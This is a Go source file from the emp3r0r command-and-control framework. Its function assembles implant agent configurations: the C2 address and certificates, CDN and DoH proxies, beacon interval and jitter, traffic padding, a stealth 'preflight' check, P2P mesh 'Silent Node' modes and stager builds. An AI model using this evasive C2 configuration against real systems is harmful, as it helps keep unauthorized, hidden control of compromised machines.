package controllers

import (
	"fmt"
	"net/url"
	"os"
	"slices"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// AgentConfig represents the options provided by a user (via CLI, Web UI, API)
// to generate a new agent configuration payload.
type AgentConfig struct {
	CCAddress        *string
	CDNProxy         *string
	C2TransportProxy *string
	DoHServer        *string
	C2ChannelMode    *string
	IsP2PEnabled     bool
	IsDirectC2       bool
	PersistentRouter bool
	IsNCSIEnabled    bool
	UseKCP           bool
	IsStager         bool
	P2PTransport     *string
	InitialPeers     *[]string
	CCHTTPPort       *string
	PollInterval     *int
	Jitter           *int
}

// MakeConfig takes the generalized AgentConfig options and orchestrates the
// filling of the JSON payload and generating/updating certificates as required.
func MakeConfig(opts AgentConfig) error {
	// Preflight check is now enabled by default for better stealth
	live.RuntimeConfig.PreflightEnabled = true

	// read existing config when possible
	if util.IsExist(live.EmpConfigFile) {
		logging.Infof("Reading config from existing %s", live.EmpConfigFile)
		jsonData, err := os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return fmt.Errorf("failed to read %s: %v", live.EmpConfigFile, err)
		}
		if err = config.ReadJSONConfig(jsonData, live.RuntimeConfig); err != nil {
			return fmt.Errorf("parsing existing %s: %v", live.EmpConfigFile, err)
		}
	}

	// CC names and certs
	if opts.CCAddress != nil {
		live.RuntimeConfig.CCAddress = *opts.CCAddress
	}
	live.RuntimeConfig.CCAddress = strings.TrimSuffix(live.RuntimeConfig.CCAddress, "/")
	logging.Infof("C2 server name: %s", live.RuntimeConfig.CCAddress)
	existingNames := transport.NamesInCert(transport.ServerCrtFile)

	if !slices.Contains(existingNames, live.RuntimeConfig.CCAddress) && live.RuntimeConfig.CCAddress != "" {
		logging.Warningf("Name '%s' is not covered by our server cert, fetching new certs from server", live.RuntimeConfig.CCAddress)

		certs, err := client.GetCerts()
		if err != nil {
			return fmt.Errorf("failed to get certs from server: %v", err)
		}

		// Save certs
		if err := os.WriteFile(transport.CaCrtFile, certs["ca_crt"], 0o644); err != nil {
			return fmt.Errorf("failed to save CA cert: %v", err)
		}
		if err := os.WriteFile(transport.ServerCrtFile, certs["server_crt"], 0o644); err != nil {
			return fmt.Errorf("failed to save Server cert: %v", err)
		}
	}

	// Internet check
	live.RuntimeConfig.EnableNCSI = opts.IsNCSIEnabled
	if live.RuntimeConfig.EnableNCSI {
		logging.Infof("NCSI is enabled")
	}

	// Proxies & Transports
	if opts.CDNProxy != nil {
		live.RuntimeConfig.CDNProxy = *opts.CDNProxy
	}
	if live.RuntimeConfig.CDNProxy != "" {
		logging.Infof("Using CDN proxy %s", live.RuntimeConfig.CDNProxy)
	}

	live.RuntimeConfig.UseKCP = opts.UseKCP
	if live.RuntimeConfig.UseKCP {
		logging.Infof("Using KCP")
	}

	if opts.C2TransportProxy != nil {
		live.RuntimeConfig.C2TransportProxy = *opts.C2TransportProxy
	}
	if live.RuntimeConfig.C2TransportProxy != "" {
		logging.Infof("Using C2 transport proxy %s", live.RuntimeConfig.C2TransportProxy)
	}

	if opts.DoHServer != nil {
		live.RuntimeConfig.DoHServer = *opts.DoHServer
	}
	if live.RuntimeConfig.DoHServer != "" {
		logging.Infof("Using DoH server %s", live.RuntimeConfig.DoHServer)
	}

	// HTTP Port
	if opts.CCHTTPPort != nil {
		live.RuntimeConfig.CCHTTPPort = *opts.CCHTTPPort
	}
	if live.RuntimeConfig.CCHTTPPort == "" {
		live.RuntimeConfig.CCHTTPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
		logging.Warningf("HTTP port not set, randomized to %s", live.RuntimeConfig.CCHTTPPort)
	}
	logging.Infof("C2 HTTP port: %s", live.RuntimeConfig.CCHTTPPort)

	if opts.C2ChannelMode != nil {
		live.RuntimeConfig.C2ChannelMode = *opts.C2ChannelMode
	}
	if live.RuntimeConfig.C2ChannelMode == "" {
		live.RuntimeConfig.C2ChannelMode = def.C2ChannelModeDefault
	}
	if _, err := transport.GetC2ChannelWrapper(live.RuntimeConfig.C2ChannelMode); err != nil {
		return fmt.Errorf("invalid c2-channel-mode: %s (available: %s)", live.RuntimeConfig.C2ChannelMode, strings.Join(transport.AllC2ChannelModes(), ","))
	}
	logging.Infof("Using C2 channel mode %s", live.RuntimeConfig.C2ChannelMode)

	if live.RuntimeConfig.PaddingMin == 0 {
		live.RuntimeConfig.PaddingMin = 1024
	}
	if live.RuntimeConfig.PaddingMax == 0 {
		live.RuntimeConfig.PaddingMax = 10240
	}
	if opts.PollInterval != nil {
		live.RuntimeConfig.PollInterval = *opts.PollInterval
	}
	if live.RuntimeConfig.PollInterval == 0 {
		live.RuntimeConfig.PollInterval = 60
	}

	if opts.Jitter != nil {
		live.RuntimeConfig.Jitter = *opts.Jitter
	}
	if live.RuntimeConfig.Jitter == 0 {
		live.RuntimeConfig.Jitter = 20
	}

	// Preflight / Hybrid Mode intervals
	if live.RuntimeConfig.PreflightURL == "" {
		// generate new if empty
		if live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
			live.RuntimeConfig.PreflightURL = fmt.Sprintf("http://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort, util.RandStr(util.RandInt(5, 10)))
		} else {
			live.RuntimeConfig.PreflightURL = fmt.Sprintf("https://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port, util.RandStr(util.RandInt(5, 10)))
		}
	} else {
		// synchronise host and port with CCAddress
		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
		if err == nil {
			if live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
				u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort)
				u.Scheme = "http"
			} else {
				u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port)
				u.Scheme = "https"
			}
			live.RuntimeConfig.PreflightURL = u.String()
		}
	}
	if live.RuntimeConfig.PreflightIntervalMin == 0 {
		live.RuntimeConfig.PreflightIntervalMin = util.RandInt(30, 120)
	}
	if live.RuntimeConfig.PreflightIntervalMax == 0 {
		live.RuntimeConfig.PreflightIntervalMax = live.RuntimeConfig.PreflightIntervalMin + util.RandInt(30, 300)
	}
	logging.Infof("Conditional C2 (Hybrid Mode) beacon interval: %d - %d seconds", live.RuntimeConfig.PreflightIntervalMin, live.RuntimeConfig.PreflightIntervalMax)

	// Mesh / P2P mode
	live.RuntimeConfig.IsP2PEnabled = opts.IsP2PEnabled
	live.RuntimeConfig.IsDirectC2Enabled = opts.IsDirectC2
	live.RuntimeConfig.PersistentRouter = opts.PersistentRouter

	if opts.P2PTransport != nil {
		isValid := false
		for _, name := range transport.AllTransportNames() {
			if name == *opts.P2PTransport {
				isValid = true
				break
			}
		}
		if !isValid {
			return fmt.Errorf("invalid p2p-transport: %s (available: %v)", *opts.P2PTransport, transport.AllTransportNames())
		}
		live.RuntimeConfig.P2PTransport = *opts.P2PTransport
	} else if live.RuntimeConfig.P2PTransport == "" {
		live.RuntimeConfig.P2PTransport = "mtls"
	}

	// Standalone agents always contact C2 directly.
	if !live.RuntimeConfig.IsP2PEnabled {
		live.RuntimeConfig.IsDirectC2Enabled = true
	}

	// Bootstrap peers for gossip
	if opts.InitialPeers != nil {
		live.RuntimeConfig.InitialPeers = *opts.InitialPeers
	}

	if live.RuntimeConfig.IsP2PEnabled && !live.RuntimeConfig.IsDirectC2Enabled {
		if len(live.RuntimeConfig.InitialPeers) == 0 {
			return fmt.Errorf("Silent Node build requires --peers: specify at least one Gateway IP:gossipport (e.g. --peers 1.2.3.4:51996)")
		}
		logging.Infof("Silent Node bootstrap peers: %v", live.RuntimeConfig.InitialPeers)
	}

	switch {
	case live.RuntimeConfig.IsP2PEnabled && live.RuntimeConfig.IsDirectC2Enabled:
		logging.Infof("Mode: Gateway (P2P mesh + direct C2 + preflight)")
	case live.RuntimeConfig.IsP2PEnabled:
		logging.Infof("Mode: Silent Node (P2P mesh only, no direct C2)")
	default:
		logging.Infof("Mode: Standalone (direct C2, no mesh)")
	}

	live.RuntimeConfig.IsRunByStager = opts.IsStager
	if live.RuntimeConfig.IsRunByStager {
		logging.Infof("Agent is built for stager")
	}

	// save JSON
	return config.SaveConfigJSON()
}
